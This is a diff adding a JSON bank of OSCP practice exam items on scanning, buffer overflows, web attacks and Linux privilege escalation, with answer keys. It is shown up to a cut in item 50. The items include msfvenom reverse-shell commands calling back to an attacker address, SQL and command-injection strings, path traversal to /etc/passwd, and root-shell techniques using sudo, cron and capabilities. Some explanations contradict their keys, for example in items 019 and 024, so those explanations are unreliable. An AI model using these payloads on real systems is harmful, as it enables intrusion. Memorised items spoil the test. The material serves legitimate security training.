@@ -1,0 +1,858 @@
+{
+    "cert_key": "oscp",
+    "title": "OffSec OSCP",
+    "issuer": "OffSec",
+    "region": "USA-SECURITY",
+    "outline_file": "outlines/oscp.json",
+    "variant_label": "OSCP Real-Spec Practice",
+    "exam": {
+        "questions": 60,
+        "duration_minutes": 120,
+        "scoring": "Pass 70/100 points",
+        "adaptive": false
+    },
+    "content_provenance": "Original practice items authored from the public OSCP exam guide topic areas. Not a capture of past exam questions.",
+    "source_label": "OSCP practice bank",
+    "items": [
+        {
+            "id": "oscp-001",
+            "domain": "Information Gathering and Scanning",
+            "stem": "A tester wants to learn which hosts are alive on a /24 network without opening connections to every port. Which nmap option performs discovery only and skips the port scan?",
+            "options": [
+                "-sn",
+                "-sT",
+                "-sV",
+                "-Pn"
+            ],
+            "correct_index": 0,
+            "explanation": "-sn tells nmap to stop after host discovery and never probe ports, while -sT opens a full connection to each port, -sV adds version fingerprinting, and -Pn assumes hosts are already up instead of discovering them.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-002",
+            "domain": "Information Gathering and Scanning",
+            "stem": "A junior tester asks why a particular scan works without raw socket privileges on the attacking machine. Which nmap scan type completes the TCP three way handshake before probing further?",
+            "options": [
+                "-sS half open SYN scan",
+                "-sT full connect scan",
+                "-sU UDP scan",
+                "-sN NULL flag scan"
+            ],
+            "correct_index": 1,
+            "explanation": "-sT uses the normal operating system connect call so the handshake completes in the kernel and no raw sockets are needed, whereas -sS, -sU and -sN all craft raw packets that require elevated privileges.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-003",
+            "domain": "Information Gathering and Scanning",
+            "stem": "Services such as DNS, SNMP and NTP never answer a TCP connection request. Which nmap scan type enumerates services that only listen on UDP?",
+            "options": [
+                "-sS",
+                "-sA",
+                "-sU",
+                "-sW"
+            ],
+            "correct_index": 2,
+            "explanation": "-sU sends UDP probes to each port because UDP daemons only answer when a valid datagram arrives, while -sS, -sA and -sW are TCP scans that would never reach a UDP only listener.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-004",
+            "domain": "Information Gathering and Scanning",
+            "stem": "A NULL scan sends a TCP segment that carries no control flags at all. Against a default Linux host, what does a closed port normally return?",
+            "options": [
+                "No response at all",
+                "A SYN ACK segment",
+                "An ICMP unreachable message",
+                "A RST segment"
+            ],
+            "correct_index": 3,
+            "explanation": "A closed TCP port answers a malformed segment with a reset, while an open port stays silent because the stack drops the segment, so silence rather than a reset points to open or filtered.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-005",
+            "domain": "Information Gathering and Scanning",
+            "stem": "A host answers ping but every port appears filtered because the discovery stage misjudges the target. Which nmap option forces the port scan stage to run anyway?",
+            "options": [
+                "-Pn",
+                "-sn",
+                "-n",
+                "--reason"
+            ],
+            "correct_index": 0,
+            "explanation": "-Pn skips discovery and treats every listed host as online so ports are still probed, while -sn does the reverse and scans no ports, -n only suppresses DNS lookups, and --reason explains each result.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-006",
+            "domain": "Information Gathering and Scanning",
+            "stem": "After ports are found, the tester wants only application level fingerprinting with no operating system detection and no traceroute. Which nmap option provides that?",
+            "options": [
+                "-sC",
+                "-sV",
+                "-O",
+                "--traceroute"
+            ],
+            "correct_index": 1,
+            "explanation": "-sV sends service probes and ranks version guesses, while -sC runs the default script set, -O fingerprints the operating system, and --traceroute only maps the path to the target.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-007",
+            "domain": "Information Gathering and Scanning",
+            "stem": "The tester wants nmap to run scripts that check discovered services against a database of known weaknesses. Which script category matches that goal?",
+            "options": [
+                "discovery",
+                "broadcast",
+                "vuln",
+                "auth"
+            ],
+            "correct_index": 2,
+            "explanation": "The vuln category runs scripts that test services for known flaws, while discovery and broadcast gather surrounding information and auth tries credentials rather than checking for published weaknesses.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-008",
+            "domain": "Information Gathering and Scanning",
+            "stem": "Default scan timing stalls badly on a fast local lab network. Which nmap timing template selects an aggressive policy suited to low latency targets?",
+            "options": [
+                "-T0",
+                "-T1",
+                "-T2",
+                "-T4"
+            ],
+            "correct_index": 3,
+            "explanation": "-T4 is the aggressive template with short delays and many parallel probes, while -T0 and -T1 are paranoid and stealthy with long pauses, and -T2 is polite but noticeably slower than aggressive.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-009",
+            "domain": "Information Gathering and Scanning",
+            "stem": "A perimeter device only inspects complete probe packets and ignores anything it cannot reassemble cleanly. Which nmap option splits packets into fragments to probe that behaviour?",
+            "options": [
+                "-f",
+                "--resume",
+                "--top-ports",
+                "-oA"
+            ],
+            "correct_index": 0,
+            "explanation": "-f fragments probes so simple inspection rules may miss them, while --resume continues an interrupted scan, --top-ports narrows the port list, and -oA only controls how results are written to disk.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-010",
+            "domain": "Information Gathering and Scanning",
+            "stem": "A firewall rule treats packets arriving from a well known service port as trusted management traffic. Which nmap option sets the source port of the probes to exploit that assumption?",
+            "options": [
+                "-S 10.10.14.5",
+                "-g 53",
+                "-D RND:10",
+                "--spoof-mac 00:11:22:33:44:55"
+            ],
+            "correct_index": 1,
+            "explanation": "-g sets the source port, so probes that appear to come from DNS may pass a naive rule, while -S spoofs the source address, -D mixes decoy sources into the scan, and --spoof-mac only changes the hardware address.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-011",
+            "domain": "Information Gathering and Scanning",
+            "stem": "A legacy Windows host is suspected of allowing anonymous sessions to enumerate its shared folders. Which command requests that share list without credentials?",
+            "options": [
+                "snmpwalk -v2c -c public 10.10.10.10",
+                "dnsrecon -d target.local",
+                "smbclient -N -L //10.10.10.10",
+                "smtp-user-enum -t 10.10.10.10 -U users.txt"
+            ],
+            "correct_index": 2,
+            "explanation": "smbclient with -N asks the SMB service for its share list with no authentication, while snmpwalk queries network management data, dnsrecon works against DNS records, and smtp-user-enum talks to the mail service.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-012",
+            "domain": "Information Gathering and Scanning",
+            "stem": "The tester has found the authoritative name server for a target domain and wants every record it holds. Which command requests a full zone transfer?",
+            "options": [
+                "dig +short target.local A",
+                "host -t MX target.local",
+                "nslookup target.local 10.10.10.10",
+                "dig axfr @ns1.target.local target.local"
+            ],
+            "correct_index": 3,
+            "explanation": "The axfr query asks the server for a complete copy of the zone, while the other commands fetch a single record such as an address or mail record and never request the whole zone.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-013",
+            "domain": "Information Gathering and Scanning",
+            "stem": "The rules of engagement allow research but forbid direct contact with the client infrastructure during the reconnaissance phase. Which activity stays within that limit?",
+            "options": [
+                "Reviewing WHOIS registration records for the target domain",
+                "Running a SYN scan against the target perimeter",
+                "Fingerprinting the web server with crafted requests",
+                "Testing default credentials against the SMB service"
+            ],
+            "correct_index": 0,
+            "explanation": "WHOIS queries public registration databases and never sends traffic to the client, whereas scanning, fingerprinting and credential testing all touch the infrastructure and would break the rule.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-014",
+            "domain": "Information Gathering and Scanning",
+            "stem": "Port 25 answers questions about individual mailboxes during a scan. Which SMTP verb asks the server to confirm a single address and often leaks valid users?",
+            "options": [
+                "EXPN",
+                "VRFY",
+                "STARTTLS",
+                "DATA"
+            ],
+            "correct_index": 1,
+            "explanation": "VRFY verifies one mailbox name and frequently confirms real accounts, while EXPN expands a distribution list instead of checking a single address, STARTTLS negotiates encryption, and DATA starts message transfer.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-015",
+            "domain": "Information Gathering and Scanning",
+            "stem": "A device answers on a UDP management port with interface names, routing details and software versions when a default read-only community string is accepted. Which protocol is in use?",
+            "options": [
+                "NTP",
+                "LDAP",
+                "SNMP",
+                "SIP"
+            ],
+            "correct_index": 2,
+            "explanation": "SNMP listens on UDP 161 and discloses configuration when a default community such as public is allowed, while NTP only reports time, LDAP serves directory lookups, and SIP handles session signalling.",
+            "reference": "OffSec OSCP Exam Guide - Information Gathering and Scanning"
+        },
+        {
+            "id": "oscp-016",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "A crashing input must be mapped to the exact byte position inside the buffer before the return address can be reached. Which Metasploit utility builds the cyclic pattern used for that measurement?",
+            "options": [
+                "msf-nasm_shell",
+                "msfvenom",
+                "msfconsole",
+                "msf-pattern_create"
+            ],
+            "correct_index": 3,
+            "explanation": "msf-pattern_create generates a unique repeating pattern and msf-pattern_offset reports where the crash value sits, while msfvenom builds payloads, msfconsole launches the framework, and msf-nasm_shell assembles instructions.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-017",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "In a 32 bit Windows stack overflow the overwritten return address is popped into a specific register by the RET instruction. Which register receives it?",
+            "options": [
+                "EIP",
+                "ESP",
+                "EBP",
+                "ESI"
+            ],
+            "correct_index": 0,
+            "explanation": "RET pops the saved address into EIP so execution continues there, while ESP points at the stack top, EBP frames the current stack frame, and ESI is a general source index register unrelated to returns.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-018",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "An exploit payload places a long run of no operation instructions immediately before the shellcode. What purpose does that run serve?",
+            "options": [
+                "It encrypts the payload so endpoint protection cannot detect it",
+                "It creates a landing area so execution slides into the shellcode even when the return address is slightly off",
+                "It stops the operating system from randomising the stack address",
+                "It slows the process so a debugger can attach before the crash"
+            ],
+            "correct_index": 1,
+            "explanation": "The sled absorbs small offset errors because any address inside it reaches the shellcode, while encryption, address randomisation and debugger timing have nothing to do with a run of no operation bytes.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-019",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "A Linux target is compromised only by file upload and the tester needs an executable that connects back to a listener. Which msfvenom invocation produces that artifact?",
+            "options": [
+                "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o stage.exe",
+                "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 -f jsp -o stage.jsp",
+                "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o stage.elf",
+                "msfvenom -x office.doc -p generic/shell_reverse_tcp -f raw -o stage.doc"
+            ],
+            "correct_index": 2,
+            "explanation": "Only the first line selects a Linux x86 reverse shell payload and writes it as an ELF, while the second builds a Windows executable, the third a Java server page, and the fourth grafts a payload into an Office template.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-020",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "The compromised host may open connections outward, but nothing on the attacker network can reach it directly. Which shell style fits that network arrangement?",
+            "options": [
+                "A bind shell that listens on a port on the target",
+                "A shell exposed through a forwarded port on the firewall",
+                "A local shell started from a mounted shared folder",
+                "A reverse shell that connects back to a listener on the attacker"
+            ],
+            "correct_index": 3,
+            "explanation": "A reverse shell only needs outbound access, which the target has, while a bind shell requires the attacker to reach an inbound port that the network blocks, and the other choices describe no callback at all.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-021",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "A stack overflow lands control on the saved return address, yet the process dies the moment it jumps into the payload. Which Windows mitigation most likely explains this?",
+            "options": [
+                "Data Execution Prevention",
+                "Address Space Layout Randomisation",
+                "Control Flow Guard",
+                "User Account Control"
+            ],
+            "correct_index": 0,
+            "explanation": "Data Execution Prevention marks the stack non executable so jumping into shellcode faults, while address randomisation moves code but does not block execution, Control Flow Guard constrains indirect calls, and User Account Control handles consent.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-022",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "An exploit that worked yesterday with hardcoded addresses now fails after the service was restarted. Which mitigation makes those addresses unreliable?",
+            "options": [
+                "Data Execution Prevention",
+                "Address Space Layout Randomisation",
+                "Mandatory Access Control",
+                "Windows Defender real time protection"
+            ],
+            "correct_index": 1,
+            "explanation": "Address randomisation gives each process a different base, so fixed addresses miss, while Data Execution Prevention blocks execution rather than moving addresses, mandatory access control restricts labels, and antivirus only scans for signatures.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-023",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "A single transfer is preferred because the callback port is rate limited and a second stage would be noticed. Which msfvenom payload name is a stageless Windows x64 meterpreter?",
+            "options": [
+                "windows/x64/meterpreter/reverse_tcp",
+                "windows/x64/shell_reverse_tcp",
+                "windows/x64/meterpreter_reverse_tcp",
+                "windows/x64/exec"
+            ],
+            "correct_index": 2,
+            "explanation": "Stageless names join the session type with an underscore and carry the whole agent in one blob, while the slash form is a two part stager that fetches a second stage, shell_reverse_tcp gives a plain command shell, and exec simply runs a command.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-024",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "The report must describe the finding precisely during the reporting phase of the engagement. Which statement correctly separates a vulnerability from an exploit?",
+            "options": [
+                "An exploit is a weakness, while a vulnerability is the patch that closes it",
+                "Both words mean exactly the same thing in a penetration test report",
+                "A vulnerability only exists once an exploit has been released publicly",
+                "A vulnerability is a weakness, while an exploit is the method or code that abuses it"
+            ],
+            "correct_index": 3,
+            "explanation": "The weakness exists whether or not code is written for it, so the first sentence is correct, while the others invert the definitions, erase the distinction, or wrongly claim that findings depend on published code.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-025",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "The banner confirms a vsftpd 2.3.4 service and the tester wants to check a local copy of Exploit-DB before writing anything. Which command performs that search?",
+            "options": [
+                "searchsploit vsftpd 2.3.4",
+                "searchsploit --update",
+                "exploitdb query vsftpd",
+                "searchploit vsftpd"
+            ],
+            "correct_index": 0,
+            "explanation": "searchsploit takes the service and version as search terms against the local archive, while --update only refreshes the archive, exploitdb query is not a valid invocation, and searchploit is simply misspelled.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-026",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "Every payload dies at the same point and a null byte appears to truncate the copy. Which analysis determines the complete set of forbidden bytes for this input?",
+            "options": [
+                "Increase the buffer length until the service finally accepts the input",
+                "Insert candidate bytes one at a time and inspect the dumped buffer to see where they stop appearing",
+                "Recompile the target with optimisation disabled and retry the original payload",
+                "Move the listener to a different port range and resend the same data"
+            ],
+            "correct_index": 1,
+            "explanation": "Testing each candidate byte against the resulting memory dump reveals exactly which values the copy chokes on, while longer buffers, recompilation and port changes say nothing about the byte set.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-027",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "A custom Windows service crashed repeatedly during testing and now refuses every connection. What should happen before the next attempt is made?",
+            "options": [
+                "Send the same payload again in case the process recovers on its own",
+                "Switch the payload to a UDP variant and retry immediately",
+                "Restart the service or reboot the host so the process and its listening socket are recreated",
+                "Raise the MTU on the attacking machine and repeat the request"
+            ],
+            "correct_index": 2,
+            "explanation": "A crashed process no longer holds its socket, so a restart brings the service back for another test, while resending data, changing transport and adjusting the MTU all leave the dead process untouched.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-028",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "An exploit overwrites the return address with a value taken from a loaded DLL and the address works on every run. Why is that address stable?",
+            "options": [
+                "Windows always places the process stack at one fixed address",
+                "The kernel disables randomisation for services running as SYSTEM",
+                "The DLL is always read straight from the page file at a constant offset",
+                "The module is not position independent and is not randomised, so it maps to the same base each time"
+            ],
+            "correct_index": 3,
+            "explanation": "A module without randomisation and without position independence loads at the same base, giving a dependable gadget address, while stacks, privilege levels and the page file do not provide such a stable code address.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-029",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "Execution prevention blocks the payload on the stack, so the plan is to borrow instruction sequences that already exist in loaded code. Which technique links those sequences together?",
+            "options": [
+                "Return oriented programming",
+                "Heap spraying",
+                "Egghunting",
+                "Format string exploitation"
+            ],
+            "correct_index": 0,
+            "explanation": "Return oriented programming chains short code fragments ending in a return to perform useful work without new executable memory, while heap spraying fills memory with payloads, egghunting locates a marker, and format strings abuse print functions.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-030",
+            "domain": "Exploitation and Buffer Overflows",
+            "stem": "Before any shellcode can run, a specific memory layout problem must exist in the target program. What must be true for a classic stack overflow to reach the saved return address?",
+            "options": [
+                "The program must already run under a privileged service account",
+                "The program copies input into a fixed size stack buffer without adequate length checking",
+                "The input must travel over UDP rather than TCP",
+                "The target must have a published CVE assigned to it"
+            ],
+            "correct_index": 1,
+            "explanation": "Without an unchecked copy into a bounded stack buffer the saved address is never reached, while privilege, transport protocol and CVE publication are unrelated to the memory layout the overflow needs.",
+            "reference": "OffSec OSCP Exam Guide - Exploitation and Buffer Overflows"
+        },
+        {
+            "id": "oscp-031",
+            "domain": "Web Application Attacks",
+            "stem": "A search field shows an identical page for both true and false conditions and never displays database output. Which technique extracts data from those behavioural differences?",
+            "options": [
+                "Union based SQL injection",
+                "Error based SQL injection",
+                "Boolean based blind SQL injection",
+                "HTTP parameter pollution"
+            ],
+            "correct_index": 2,
+            "explanation": "Boolean based injection infers data from differences in the page when nothing is echoed, while union based returns rows directly, error based relies on database errors, and parameter pollution confuses routing rather than querying a database.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-032",
+            "domain": "Web Application Attacks",
+            "stem": "A tester plans to append a second query to a vulnerable parameter so its rows appear alongside the original results. Which precondition must that second query meet?",
+            "options": [
+                "It must run against a different database schema than the original",
+                "The injection point must sit inside an HTTP cookie",
+                "The database account must hold the DBA role",
+                "It must select the same number of columns with compatible data types"
+            ],
+            "correct_index": 3,
+            "explanation": "The engine merges results only when both selects match in column count and compatible types, while schema, injection location and elevated privileges have no bearing on whether the union itself is valid.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-033",
+            "domain": "Web Application Attacks",
+            "stem": "A login form concatenates the username into a query and the tester wants the condition to evaluate as true for the first returned row. Which payload attempts that?",
+            "options": [
+                "' OR '1'='1' -- ",
+                "' AND '1'='2' -- ",
+                "' OR '1'='2' -- ",
+                "' ORDER BY 100 -- "
+            ],
+            "correct_index": 0,
+            "explanation": "The OR condition is always true so the first row is returned and often belongs to an administrator, while AND and OR with a false comparison return nothing, and ORDER BY 100 merely raises an error about column count.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-034",
+            "domain": "Web Application Attacks",
+            "stem": "The application returns no data and no errors, yet the tester can measure how long each request takes. Which signal confirms a query bit by bit under these conditions?",
+            "options": [
+                "A change in the HTTP status code to 500",
+                "A response delay introduced by a sleep function inside the injected query",
+                "A longer session cookie value",
+                "A different page title in the response"
+            ],
+            "correct_index": 1,
+            "explanation": "Time based injection hinges on a deliberate delay that depends on the answer, while status codes, cookie length and titles do not reveal database content when the application swallows both output and errors.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-035",
+            "domain": "Web Application Attacks",
+            "stem": "Text submitted to a comment field is stored on the server and rendered to every later visitor of that page. Which category of cross site scripting does this represent?",
+            "options": [
+                "Reflected cross site scripting",
+                "DOM based cross site scripting",
+                "Stored cross site scripting",
+                "Self inflicted cross site scripting"
+            ],
+            "correct_index": 2,
+            "explanation": "The script persists server side and runs for each visitor, which defines stored XSS, while reflected XSS returns in the same response, DOM based XSS never reaches the server, and self inflicted XSS only affects the sender.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-036",
+            "domain": "Web Application Attacks",
+            "stem": "Session theft through injected script should be blocked even when the script runs in the victim browser. Which cookie attribute prevents client side script from reading the session value?",
+            "options": [
+                "SameSite",
+                "Domain",
+                "Path",
+                "HttpOnly"
+            ],
+            "correct_index": 3,
+            "explanation": "HttpOnly removes the cookie from document.cookie access so injected script cannot read it, while SameSite limits cross site sending, and Domain and Path only decide where the cookie is transmitted.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-037",
+            "domain": "Web Application Attacks",
+            "stem": "A funds transfer form carries no anti-CSRF token and relies only on the browser session cookie. Which attack makes an authenticated victim submit that form without intending to?",
+            "options": [
+                "Cross site request forgery",
+                "Cross site scripting",
+                "Server side request forgery",
+                "SQL injection through the amount field"
+            ],
+            "correct_index": 0,
+            "explanation": "Cross site request forgery abuses the fact that the browser attaches the session cookie to a forged request, while cross site scripting runs script, server side forgery makes the server fetch a URL, and injection targets the query.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-038",
+            "domain": "Web Application Attacks",
+            "stem": "A diagnostic page passes the address supplied by the visitor to the ping utility on a Linux host. Which input attempts to run an additional command after the ping?",
+            "options": [
+                "127.0.0.1",
+                "127.0.0.1; id",
+                "<script>alert(1)</script>",
+                "../../../../etc/passwd"
+            ],
+            "correct_index": 1,
+            "explanation": "The semicolon terminates the ping and starts the id command, while a plain address runs only ping, the script tag targets a browser, and the traversal string targets file inclusion rather than command execution.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-039",
+            "domain": "Web Application Attacks",
+            "stem": "A PHP page includes a file whose name comes from the query string. Which value attempts to reach the operating system password file through that parameter?",
+            "options": [
+                "' OR '1'='1' -- ",
+                "A server side fetch of the cloud metadata endpoint",
+                "../../../../../../etc/passwd",
+                "<img src=x onerror=alert(1)>"
+            ],
+            "correct_index": 2,
+            "explanation": "The traversal escapes the web root and reaches the password file, while the SQL payload targets a database query, the metadata fetch targets a server side request feature, and the image tag targets script execution in a browser.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-040",
+            "domain": "Web Application Attacks",
+            "stem": "A preview feature fetches a URL supplied by the user on behalf of the server. Which address reaches the metadata service of a cloud instance?",
+            "options": [
+                "The loopback address 127.0.0.1 on the admin port",
+                "The local file located at /etc/hosts",
+                "The gopher scheme pointed at the SSH port",
+                "The link local address 169.254.169.254 used by cloud instances"
+            ],
+            "correct_index": 3,
+            "explanation": "The link local address 169.254.169.254 serves cloud instance metadata, while the loopback address reaches a local admin page, the file scheme reads local files, and gopher smuggles raw protocol traffic for a different goal.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-041",
+            "domain": "Web Application Attacks",
+            "stem": "An API accepts XML and its parser resolves entities that are declared outside the document body. Which payload reads a local file by abusing that behaviour?",
+            "options": [
+                "A document type declaration defining an external entity bound to a local file path",
+                "A JSON web token whose header algorithm is set to none",
+                "A serialized object stored in a session cookie",
+                "A multipart upload using a double file extension"
+            ],
+            "correct_index": 0,
+            "explanation": "External entity resolution in XML is the essence of XXE and can disclose local files, while an unsigned token abuses signature checks, a serialized object targets deserialization, and a double extension targets upload filters.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-042",
+            "domain": "Web Application Attacks",
+            "stem": "An upload filter rejects any file name containing php, and the web server maps files ending in phtml to the PHP interpreter. Which uploaded name is accepted and then executed?",
+            "options": [
+                "shell.php.jpg",
+                "shell.phtml",
+                "shell.jpg.php",
+                "shell.php.txt"
+            ],
+            "correct_index": 1,
+            "explanation": "phtml is not matched by the filter yet the server still runs it as PHP, while the other three names all contain php and are rejected before any file is stored.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-043",
+            "domain": "Web Application Attacks",
+            "stem": "A Java endpoint rebuilds an object from an unsanitized cookie and instantiates whatever classes the incoming data names. Which vulnerability class results from this design?",
+            "options": [
+                "Server side request forgery through the cookie header",
+                "Cross site request forgery against the active session",
+                "Insecure deserialization that can chain gadgets into code execution",
+                "HTTP request smuggling using a duplicated header"
+            ],
+            "correct_index": 2,
+            "explanation": "Rebuilding objects from untrusted data is insecure deserialization and gadget chains can reach code execution, while request forgery and smuggling abuse HTTP handling rather than object reconstruction.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-044",
+            "domain": "Web Application Attacks",
+            "stem": "A JSON web token is decoded but its signature is ignored by the verification logic. Which alteration makes the server accept a token that carries no signature at all?",
+            "options": [
+                "Re sign the payload with a longer key",
+                "Compress the payload before base64 encoding it",
+                "Add an extra claim to the header",
+                "Set the header algorithm value to none and strip the signature block"
+            ],
+            "correct_index": 3,
+            "explanation": "Setting the algorithm to none and removing the signature exploits verifiers that honour that value, while re signing, compressing and adding claims leave the verification path unchanged.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-045",
+            "domain": "Web Application Attacks",
+            "stem": "A profile page loads records by an incrementing id parameter and checks only that a session cookie exists, so editing the id reveals another user's record. Which issue is this?",
+            "options": [
+                "Insecure direct object reference through broken access control",
+                "Server side template injection in the id parameter",
+                "Stored SQL injection in the profile query",
+                "Cross site request forgery on the profile page"
+            ],
+            "correct_index": 0,
+            "explanation": "Direct references to user controlled identifiers without ownership checks are IDOR broken access control, while template injection targets the rendering engine, SQL injection targets the query, and forgery targets the victim browser.",
+            "reference": "OffSec OSCP Exam Guide - Web Application Attacks"
+        },
+        {
+            "id": "oscp-046",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "During local enumeration on a Linux host the goal is to find every regular file that runs with the owner's privileges when executed. Which command lists those files?",
+            "options": [
+                "ls -la /usr/bin",
+                "find / -perm -4000 -type f 2>/dev/null",
+                "getcap -r / 2>/dev/null",
+                "cat /etc/passwd"
+            ],
+            "correct_index": 1,
+            "explanation": "The permission mask 4000 selects the SUID bit on regular files, while ls only shows one directory, getcap reports assigned capabilities instead of SUID, and the password file lists accounts with no privilege information.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-047",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "sudo -l shows that the current account may run /usr/bin/find as root without a password. Which invocation immediately yields a root shell?",
+            "options": [
+                "find . -exec chmod 644 {} +",
+                "chmod 4755 /usr/bin/find",
+                "find . -exec /bin/sh -p \\;",
+                "systemctl restart cron"
+            ],
+            "correct_index": 2,
+            "explanation": "find executes the supplied command with the effective privileges granted by sudo and the -p flag keeps them, while changing file modes or restarting a daemon either needs privileges already or never creates a shell.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-048",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "A root crontab entry runs a helper script from a folder the current user is allowed to write into. Which action turns that schedule into a root shell?",
+            "options": [
+                "Edit the crontab to change the schedule to run every minute",
+                "Create a new account with useradd and switch to it",
+                "Restart the cron daemon so it reloads its configuration",
+                "Replace the script with commands that copy a shell to a temporary path and set its SUID bit"
+            ],
+            "correct_index": 3,
+            "explanation": "cron runs the script as root, so rewriting its contents gives root code execution, while rescheduling runs the same unmodified script, adding an account changes nothing about privileges, and restarting cron just reloads the same jobs.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-049",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "getcap reports that the Python interpreter carries cap_setuid with the effective bit set. Which step converts that capability into a root shell?",
+            "options": [
+                "Call setuid(0) from a short Python script and then spawn a shell",
+                "Append the account name to the sudoers file",
+                "Set the SUID bit on the interpreter a second time",
+                "Reboot the host so the capability is reloaded"
+            ],
+            "correct_index": 0,
+            "explanation": "cap_setuid lets the process choose any user id including root, while sudoers edits require root already, the SUID bit does not grant a capability the file already has, and a reboot changes nothing about the assignment.",
+            "reference": "OffSec OSCP Exam Guide - Privilege Escalation and Tunneling"
+        },
+        {
+            "id": "oscp-050",
+            "domain": "Privilege Escalation and Tunneling",
+            "stem": "uname reports an old kernel build with several published local privilege escalation issues. Which verification must happen before any exploit is executed?",
+            "options": [
+                "Run the newest exploit first because kernels remain backward compatible",
+                "Confirm the distribution, exact kernel version and architecture match the exploit assumptions",
+                "Disable every security module and reboot without any testing",
